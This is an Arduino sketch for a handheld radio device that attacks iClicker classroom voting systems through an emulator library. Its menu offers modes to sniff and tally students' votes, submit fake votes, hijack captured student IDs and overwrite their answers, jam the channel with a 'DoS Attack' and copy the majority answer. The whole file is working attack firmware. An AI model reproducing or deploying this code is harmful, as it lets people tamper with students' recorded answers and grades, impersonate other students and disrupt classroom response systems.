#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "iClickerEmulator.h"
#include <RingBufCPP.h>
#include <string.h>

#define MY_CLICKER_ID 0x0000AAAA
#define BUTTON_A  9
#define BUTTON_B  6
#define BUTTON_C  5
#define IS_RFM69HW true
#define IRQ_PIN 3
#define CSN 8
#define VBATPIN A7
#define MAX_BUFFERED_PACKETS 100
#define THRESHOLD 1000
#define MAX_RECVD 500
#define RAND_LOW 35
#define RAND_HIGH 75

uint8_t clicker_id[4];
int hij = 0;
int dos = 0;

Adafruit_SSD1306 display = Adafruit_SSD1306(128, 32, &Wire);
iClickerAnswerPacket recvd[MAX_RECVD];
uint32_t num_recvd = 0;
iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);
RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;

int mode = 0;
int ans = 0;
bool active = false;
int ctr = 0;
bool a_state = true;
bool b_state = true;
bool c_state = true;
int sent = -1;
float measuredvbat = 0;
int batpercentage;

void input() {
  float measuredvbat = round((((float(analogRead(VBATPIN))/1024)*2*3.3) - 3.2) * 100);
  bool a_read = (measuredvbat < -140);
  bool b_read = digitalRead(BUTTON_B);
  bool c_read = digitalRead(BUTTON_C);
  if(a_read && a_read != a_state) {
    mode = (mode + 1) % 6;
    active = false;
  }
  if(b_read && b_read != b_state) {
    ans = (ans + 1) % 5;
    active = false;
  }
  if(c_read && c_read != c_state) {
    active = !active;
  }
  a_state = a_read;
  b_state = b_read;
  c_state = c_read;
  if (!a_read) {
    batpercentage = measuredvbat;
  }
}

void output() {
  display.clearDisplay();
  display.setTextSize(0);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(100,24);
  display.println(String(batpercentage) + "%");
  display.setCursor(0,0);
  switch(mode) {
    case 0:
      display.println("A) Mode: View Votes");
      break;
    case 1:
      display.println("A) Mode: Fake Votes");
      break;
    case 2:
      display.println("A) Mode: Change Votes");
      break;
    case 3:
      display.println("A) Mode: DoS Attack");
      break;
    case 4:
      display.println("A) Mode: Copy Votes");
      break;
    case 5:
      display.println("A) Mode: Vote Choice");
      break;
  }
  switch(ans) {
    case 0:
      display.println("B) Choice: A");
      break;
    case 1:
      display.println("B) Choice: B");
      break;
    case 2:
      display.println("B) Choice: C");
      break;
    case 3:
      display.println("B) Choice: D");
      break;
    case 4:
      display.println("B) Choice: E");
      break;
  }
  if(active) {
    display.println("C) Active: Yes");
    ctr = (++ctr) % 50;
    if (ctr == 0) sent = -1;
    if(mode == 0 || mode == 4 || mode == 5) {
        char tmp[100];
        uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
        for (uint32_t i = 0; i < num_recvd; i++) {
          res[recvd[i].answer]++;
        }
        snprintf(tmp, sizeof(tmp), "A%u B%u C%u D%u E%u", res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING]);
        if(mode == 5) {
          switch(ans) {
            case 0:
              if (sent != 1) {
                  clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('a'));
                  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
                  sent = 1;
              }
              break;
            case 1:
              if (sent != 2) {
                  clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('b'));
                  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
                  sent = 2;
              }
              break;
            case 2:
              if (sent != 3) {
                  clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('c'));
                  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
                  sent = 3;
              }
              break;
            case 3:
              if (sent != 4) {
                  clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('d'));
                  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
                  sent = 4;
              }
              break;
            case 4:
              if (sent != 5) {
                  clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('e'));
                  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
                  sent = 5;
              }
              break;
          }
        } else if (mode == 4 && ctr == 0) {
          int most = max(max(max(max(res[ANSWER_E], res[ANSWER_D]), res[ANSWER_C]), res[ANSWER_B]), res[ANSWER_A]);
          if (most > 0) {
            if (most == res[ANSWER_A] && sent != 1) {
              clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('a'));
              clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
              sent = 1;
            } else if (most == res[ANSWER_B] && sent != 2) {
              clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('b'));
              clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
              sent = 2;
            } else if (most == res[ANSWER_C] && sent != 3) {
              clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('c'));
              clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
              sent = 3;
            } else if (most == res[ANSWER_D] && sent != 4) {
              clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('d'));
              clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
              sent = 4;
            } else if (most == res[ANSWER_E] && sent != 5) {
              clicker.submitAnswer(clicker_id, iClickerEmulator::charAnswer('e'));
              clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
              sent = 5;
            }
          }
        }
        display.println(tmp);
    }
    char tmp[100];
    switch(mode) {
      case 1:
        snprintf(tmp, sizeof(tmp), "Sent: %u", dos);
        display.println(tmp);
        break;
        break;
      case 2:
        snprintf(tmp, sizeof(tmp), "Changed: %u", hij);
        display.println(tmp);
        break;
      case 3:
        snprintf(tmp, sizeof(tmp), "Packets: %uk", round(dos/10));
        display.println(tmp);
        break;
    }
  } else {
      display.println("C) Active: No");
  }
  display.display();
}

bool is_active = false;

void setup() {
  intToByteArray(MY_CLICKER_ID, clicker_id);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  pinMode(BUTTON_A, INPUT_PULLUP);
  pinMode(BUTTON_B, INPUT_PULLUP);
  pinMode(BUTTON_C, INPUT_PULLUP);
  clicker.begin(iClickerChannels::AA);
}

int curr_mode = -1;

void loop() {
  input();
  iClickerPacket r;
  while (recvBuf.pull(&r) && r.type == PACKET_ANSWER) {
    handleCapture(r.packet.answerPacket);
  }
  if(!active) {
    if(is_active) {
      clicker.stopPromiscuous();
      is_active = false;
    }
  } else {
    if(!is_active) {
      clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
    }
    if(!is_active || curr_mode != mode) {
      switch(mode) {
        case 4:
        case 5:
          sent = -1;
        case 0:
          num_recvd = 0;
          break;
        case 1:
          dos = 0;
          ans_randoms();
          break;
        case 2:
          hij = 0;
            switch(ans) {
              case 0:
                resubmit_ans(iClickerEmulator::charAnswer('a'), 100);
                break;
              case 1:
                resubmit_ans(iClickerEmulator::charAnswer('b'), 100);
                break;
              case 2:
                resubmit_ans(iClickerEmulator::charAnswer('c'), 100);
                break;
              case 3:
                resubmit_ans(iClickerEmulator::charAnswer('d'), 100);
                break;
              case 4:
                resubmit_ans(iClickerEmulator::charAnswer('e'), 100);
                break;
            }
          break;
        case 3:
          dos = 0;
          ddos();
          break;
      }      
      curr_mode = mode;
      is_active = true;
    }
  }
  output();
  delay(50);
  yield();
}

void resubmit_ans(iClickerAnswer a, uint8_t percent) {
  iClickerPacket r;
  uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
  while (!shouldExit()) {
      if (recvBuf.pull(&r) && r.type == PACKET_ANSWER) {
          iClickerAnswerPacket ap = r.packet.answerPacket;
          handleCapture(ap);
          bool ret = clicker.submitAnswer(ap.id, a);
          printSubmission(ret, ap.id, a);
          clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
          res[a]++;
          hij++;
      }
      output();
      delay(10);
      yield();
  }
}


void uniform_ans() {
    iClickerPacket r;
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
    uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
    while (!shouldExit()) {
        if (recvBuf.pull(&r) && r.type == PACKET_ANSWER) {
            iClickerAnswerPacket ap = r.packet.answerPacket;
            handleCapture(ap);
            iClickerAnswer answer = clicker.randomAnswer();
            bool ret = clicker.submitAnswer(ap.id, answer);
            printSubmission(ret, ap.id, answer);
            clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
            res[answer]++;
          }
          delay(10);
      }
      char tmp[100];
      snprintf(tmp, sizeof(tmp), "Resubmitted:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
               res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );
}

void ans_randoms() {
    while (!shouldExit()) {
        output();
        clicker.floodAttack(50, 1);
        dos += 50;
    }
}


void ddos() {
    while (!shouldExit()) {
        output();
        dos += 1;
        clicker.ddos(100);
    }
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
}

void printCap() {
  char tmp[100];
  uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
  for (uint32_t i = 0; i < num_recvd; i++) {
    res[recvd[i].answer]++;
    char answer = iClickerEmulator::answerChar(recvd[i].answer);
    snprintf(tmp, sizeof(tmp), "Captured[%lu]: %c (%02X, %02X, %02X, %02X)", i, answer,
             recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
  }

  snprintf(tmp, sizeof(tmp), "Results:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
           res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );
}

void printSubmission(bool suc, uint8_t id[ICLICKER_ID_LEN], iClickerAnswer ans) {
    char tmp[100];
    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)",
    suc ? "Successfully submitted" : "Failed to submit", iClickerEmulator::answerChar(ans), id[0], id[1], id[2], id[3]);
}

bool shouldExit() {
    input();
    return !active;
}

void handleCapture(iClickerAnswerPacket answerPacket) {
    char tmp[100];
    uint8_t *id = answerPacket.id;
    char answer = iClickerEmulator::answerChar(answerPacket.answer);
    updateRef(answerPacket);
    snprintf(tmp, sizeof(tmp), "Captured [%lu]: %c (%02X, %02X, %02X, %02X)", num_recvd, answer, id[0], id[1], id[2], id[3]);
}

void recvPacketHandler(iClickerPacket *recvd) {
  recvBuf.add(*recvd);
}

void updateRef(iClickerAnswerPacket p) {
  uint32_t i = 0;
  for (i = 0; i < num_recvd; i++) {
    if (!memcmp(recvd[i].id, p.id, ICLICKER_ID_LEN)) {
      recvd[i] = p;
      break;
    }
  }
  if (i == num_recvd && num_recvd < MAX_RECVD) {
    recvd[num_recvd++] = p;
  }
}

static inline void intToByteArray(const uint32_t input, uint8_t output[4]) {
  output[0] = input >> 24;
  output[1] = input >> 16 & 0xFF;
  output[2] = input >> 8 & 0xFF;
  output[3] = input & 0xFF;
}
